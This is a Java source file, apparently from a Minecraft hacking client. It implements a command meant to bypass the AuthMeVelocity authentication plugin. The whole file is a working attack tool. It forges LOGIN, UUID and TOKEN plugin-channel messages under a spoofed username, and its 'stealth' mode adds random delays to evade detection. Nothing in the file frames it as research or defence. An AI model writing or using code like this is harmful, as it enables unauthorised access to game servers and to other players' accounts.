package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.util.Util;
import net.paradise_client.Helper;
import net.paradise_client.command.Command;

import java.nio.charset.StandardCharsets;
import java.util.Random;
import java.util.UUID;

public class AuthMeVelocityBypassCommand extends Command {
    private final Random random = new Random();

    public AuthMeVelocityBypassCommand() {
        super("authmevelocitybypass", "Attempts to bypass AuthMeVelocity with multiple spoof modes");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(context -> {
            runBypass("stealth");
            return SINGLE_SUCCESS;
        }).then(argument("mode", StringArgumentType.word())
            .executes(ctx -> {
                String mode = StringArgumentType.getString(ctx, "mode");
                runBypass(mode);
                return SINGLE_SUCCESS;
            }));
    }

    private void runBypass(String mode) {
        new Thread(() -> {
            try {
                if (!Helper.isPluginChannelRegistered("authmevelocity:main")) {
                    Helper.printChatMessage("§c[AuthMeVelocity] Plugin channel not registered.");
                    return;
                }

                String name = MinecraftClient.getInstance().getGameProfile().getName();
                String spoofName = spoofUsername(name);
                UUID spoofedUUID = UUID.nameUUIDFromBytes(("OfflinePlayer:" + spoofName).getBytes(StandardCharsets.UTF_8));

                switch (mode.toLowerCase()) {
                    case "stealth":
                        stealthLogin(spoofName);
                        break;
                    case "aggressive":
                        aggressiveChain(spoofName, spoofedUUID);
                        break;
                    case "normal":
                    default:
                        simpleLogin(spoofName);
                        break;
                }

            } catch (Exception e) {
                Helper.printChatMessage("§c[AuthMeVelocity] Error: " + e.getMessage());
            }
        }, "AuthMeVelocity-BypassThread").start();
    }

    private void simpleLogin(String spoofName) {
        Helper.sendPluginMessage("authmevelocity:main", out -> {
            out.writeUTF("LOGIN");
            out.writeUTF(spoofName);
        });
        Helper.printChatMessage("§a[AuthMeVelocity] Simple LOGIN sent as §e" + spoofName);
    }

    private void stealthLogin(String spoofName) {
        try {
            Thread.sleep(300 + random.nextInt(500));
        } catch (InterruptedException ignored) {}

        Helper.sendPluginMessage("authmevelocity:main", out -> {
            out.writeUTF("LOGIN");
            out.writeUTF(spoofName);
        });

        Helper.printChatMessage("§7[Stealth] LOGIN sent as §e" + spoofName);
    }

    private void aggressiveChain(String spoofName, UUID spoofUUID) {
        Helper.sendPluginMessage("authmevelocity:main", out -> {
            out.writeUTF("LOGIN");
            out.writeUTF(spoofName);
        });

        delay(100);

        Helper.sendPluginMessage("authmevelocity:main", out -> {
            out.writeUTF("UUID");
            out.writeUTF(spoofUUID.toString());
        });

        delay(100);

        Helper.sendPluginMessage("authmevelocity:main", out -> {
            out.writeUTF("TOKEN");
            out.writeUTF(generateFakeToken(spoofName));
        });

        Helper.printChatMessage("§c[Aggressive] Sent LOGIN + UUID + TOKEN chain for §e" + spoofName);
    }

    private String generateFakeToken(String name) {
        return Util.getUuidAsString(UUID.nameUUIDFromBytes(("Token:" + name + System.currentTimeMillis()).getBytes()));
    }

    private void delay(int ms) {
        try {
            Thread.sleep(ms + random.nextInt(50));
        } catch (InterruptedException ignored) {}
    }

    private String spoofUsername(String base) {
        String suffix = "_" + Integer.toHexString(random.nextInt(0xFFF));
        return (base + suffix).substring(0, Math.min(16, base.length() + suffix.length()));
    }
}
